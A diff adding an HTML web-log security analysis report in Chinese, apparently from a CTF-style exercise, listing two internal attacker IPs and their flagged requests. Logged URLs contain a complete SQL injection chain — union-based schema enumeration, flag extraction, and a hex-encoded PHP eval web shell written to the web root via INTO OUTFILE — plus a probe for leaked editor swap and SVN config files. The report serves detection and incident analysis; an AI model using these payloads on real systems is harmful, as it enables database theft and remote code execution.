@@ -1,0 +1,105 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Web日志安全分析报告</title>
+<style type="text/css">
+body,td,th {
+	font-family: "微软雅黑";
+}
+body {
+	background-color:#D2F0FF;
+}
+.header {
+	background-color:#D2F0FF;
+	width: 80%;
+	margin:0 auto;	
+	margin-top:30px;
+}
+.mid {
+	margin: 0 auto;
+	width: 90%;
+	height: 80%;
+	margin: 0 auto;
+}
+.title {
+	font-size: 14px;
+	height:30px;
+}
+.content{
+	font-size:12px;
+        word-break: break-all;
+        word-wrap:break-word;
+	height:30px;
+}
+a:link {
+	text-decoration: none;
+}
+a:visited {
+	text-decoration: none;
+}
+a:hover {
+	text-decoration: none;
+}
+a:active {
+	text-decoration: none;
+}
+</style>
+<script language="javascript">
+function toggledetail(domid){
+if(document.getElementById(domid).style.display == "none"){
+document.getElementById(domid).style.display = '';
+}else{		
+document.getElementById(domid).style.display = 'none';
+}
+}
+</script>
+</head>
+<body>
+<div class="header">
+<h1 align="center" style="margin-top:50px"><strong>Web日志安全分析报告</strong></h1>
+<p align="right" style="margin-right:42px">报告生成时间：2023-09-15
+</p>
+</div>
+<div class="mid">
+  <table width="100%" border="0" name="test">
+	<tr bgcolor="#6699CC" class="title">
+      <th width="100%" scope="col" align="left">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;恶意IP列表</th>
+    </tr>
+  </table>
+  <table width="100%" border="0">
+	<tr bgcolor="#80BFFF" class="title">
+      <th width="10%" scope="col">ID</th>
+      <th width="30%" scope="col">攻击者IP</th>
+      <th width="40%" scope="col">所在地区</th>
+	  <th width="20%" scope="col">查&nbsp;&nbsp;&nbsp;&nbsp;看</th>
+    </tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">1</td><td align="center">192.168.150.1</td><td align="center">局域网 对方和您在同一内部网</td><td align="center"><a href="#0">查看详细</a></td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">2</td><td align="center">192.168.150.2</td><td align="center">局域网 对方和您在同一内部网</td><td align="center"><a href="#1">查看详细</a></td></tr>
+</table><table width="100%" border="0" style="margin-top:8px"><tr bgcolor="#6699CC" class="title"><th width="100%" scope="col" align="left">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每IP详细访问列表</th></tr></table>
+<table width="100%" border="0"><tr bgcolor="#A3C1E0" class="title"><th width="20%" scope="col"><a name="0">攻击者IP地址：192.168.150.1</a></th><th width="60%" scope="col" >所在地区：局域网 对方和您在同一内部网</th><th width="20%" scope="col"><a href="javascript:void(0);" onclick="javascript:toggledetail('0');">+展开详情+</th></tr></table><table width="100%" border="0" id="0"><tr bgcolor="#80BFFF" class="title"><th width="6%" scope="col">ID</th><th width="14%" scope="col">访问时间</th><th width="7%" scope="col">数据提交方式</th><th width="33%" scope="col">访问地址（URL）</th><th width="14%" scope="col">攻击方法</th><th width="22%" scope="col">浏览器类型</th><th width="14%" scope="col">响应码</th></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">1</td><td align="center">10/Mar/2023:08:16:55</td><td align="center">GET</td><td align="center">/index.php?id=1%27+or+1%3D1%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">2</td><td align="center">10/Mar/2023:08:17:04</td><td align="center">GET</td><td align="center">/index.php?id=1%27+order+by+4%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">3</td><td align="center">10/Mar/2023:08:17:18</td><td align="center">GET</td><td align="center">/index.php?id=0%27+union+select+1%2C2%2C3%2Cdatabase%28%29%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">4</td><td align="center">10/Mar/2023:08:17:32</td><td align="center">GET</td><td align="center">/index.php?id=0%27+union+select+1%2C2%2C3%2Cgroup_concat%28table_name%29+from+information_schema.tables+where+table_schema%3D%27transcript%27%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">5</td><td align="center">10/Mar/2023:08:17:43</td><td align="center">GET</td><td align="center">/index.php?id=0%27+union+select+1%2C2%2C3%2Cgroup_concat%28column_name%29+from+information_schema.columns+where+table_name%3D%27fl4g%27%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">6</td><td align="center">10/Mar/2023:08:17:46</td><td align="center">GET</td><td align="center">/index.php?id=0%27+union+select+1%2C2%2C3%2Cgroup_concat%28column_name%29+from+information_schema.columns+where+table_name%3D%27fl4g%27%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">7</td><td align="center">10/Mar/2023:08:18:01</td><td align="center">GET</td><td align="center">/index.php?id=1+and+length%28database%28%29%29%3C%3D5%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">8</td><td align="center">10/Mar/2023:08:18:05</td><td align="center">GET</td><td align="center">/index.php?id=1%27%3Bshow+databases%3B</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">9</td><td align="center">10/Mar/2023:08:19:46</td><td align="center">GET</td><td align="center">/index.php?id=0%27%20union%20select%201,0x223c3f70687020406576616c28245f504f53545b273362393064373564653234386365353562363665386533303837336236303030275d293b3f3e22,3,4%20into%20outfile%20%22/var/www/html/ShEll1.php%22;</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">10</td><td align="center">10/Mar/2023:08:20:05</td><td align="center">GET</td><td align="center">/index.php?id=0%27%20union%20select%201,0x223c3f70687020406576616c28245f504f53545b273362393064373564653234386365353562363665386533303837336236303030275d293b3f3e22,3,4%20into%20outfile%20%22/var/www/html/ShEll1.php%22%20</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">11</td><td align="center">10/Mar/2023:08:21:21</td><td align="center">GET</td><td align="center">/index.php?id=0%27+union+select+1%2C0x223c3f70687020406576616c28245f504f53545b273362393064373564653234386365353562363665386533303837336236303030275d293b3f3e22%2C3%2C4+into+outfile+%22%2Fvar%2Fwww%2Fhtml%2Ftest2.php%22%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">12</td><td align="center">10/Mar/2023:08:21:26</td><td align="center">GET</td><td align="center">/index.php?id=0%27+union+select+1%2C0x223c3f70687020406576616c28245f504f53545b273362393064373564653234386365353562363665386533303837336236303030275d293b3f3e22%2C3%2C4+into+outfile+%22%2Fvar%2Fwww%2Fhtml%2Ftest2.php%22--%2B+</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">13</td><td align="center">10/Mar/2023:08:23:05</td><td align="center">GET</td><td align="center">/index.php?id=0%27+union+select+1%2C0x223c3f70687020406576616c28245f504f53545b273362393064373564653234386365353562363665386533303837336236303030275d293b3f3e22%2C3%2C4+into+outfile+%22%2Fvar%2Fwww%2Fhtml%2Ftest2.php%22%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">14</td><td align="center">10/Mar/2023:08:23:18</td><td align="center">GET</td><td align="center">/index.php?id=0%27+union+select+1%2C2%2C3%2Cgroup_concat%28transcript_flag%29+from+fl4g%23</td><td align="center">SQL注入攻击</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36</td><td align="center">200</td></tr>
+<table width="100%" border="0"><tr bgcolor="#A3C1E0" class="title"><th width="20%" scope="col"><a name="1">攻击者IP地址：192.168.150.2</a></th><th width="60%" scope="col" >所在地区：局域网 对方和您在同一内部网</th><th width="20%" scope="col"><a href="javascript:void(0);" onclick="javascript:toggledetail('1');">+展开详情+</th></tr></table><table width="100%" border="0" id="1"><tr bgcolor="#80BFFF" class="title"><th width="6%" scope="col">ID</th><th width="14%" scope="col">访问时间</th><th width="7%" scope="col">数据提交方式</th><th width="33%" scope="col">访问地址（URL）</th><th width="14%" scope="col">攻击方法</th><th width="22%" scope="col">浏览器类型</th><th width="14%" scope="col">响应码</th></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">1</td><td align="center">10/Mar/2023:08:22:36</td><td align="center">GET</td><td align="center">/.config.inc.php.swp</td><td align="center">WebShell</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</td><td align="center">404</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">2</td><td align="center">10/Mar/2023:08:22:36</td><td align="center">GET</td><td align="center">/.config.php.swp</td><td align="center">WebShell</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</td><td align="center">404</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">3</td><td align="center">10/Mar/2023:08:22:37</td><td align="center">GET</td><td align="center">/.configuration.php.swp</td><td align="center">WebShell</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</td><td align="center">404</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">4</td><td align="center">10/Mar/2023:08:22:37</td><td align="center">GET</td><td align="center">/.index.php.swp</td><td align="center">WebShell</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</td><td align="center">404</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">5</td><td align="center">10/Mar/2023:08:22:37</td><td align="center">GET</td><td align="center">/.localsettings.php.swp</td><td align="center">WebShell</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</td><td align="center">404</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">6</td><td align="center">10/Mar/2023:08:22:38</td><td align="center">GET</td><td align="center">/.settings.php.swp</td><td align="center">WebShell</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</td><td align="center">404</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">7</td><td align="center">10/Mar/2023:08:22:38</td><td align="center">GET</td><td align="center">/.settings/org.eclipse.php.core.prefs</td><td align="center">WebShell</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</td><td align="center">404</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">8</td><td align="center">10/Mar/2023:08:22:38</td><td align="center">GET</td><td align="center">/.svn/text-base/index.php.svn-base</td><td align="center">WebShell</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</td><td align="center">404</td></tr>
+<tr bgcolor="#B3D9FF" class="content"><td align="center">9</td><td align="center">10/Mar/2023:08:22:38</td><td align="center">GET</td><td align="center">/.wp-config.php.swp</td><td align="center">WebShell</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</td><td align="center">404</td></tr>
+</table></div></body></html>
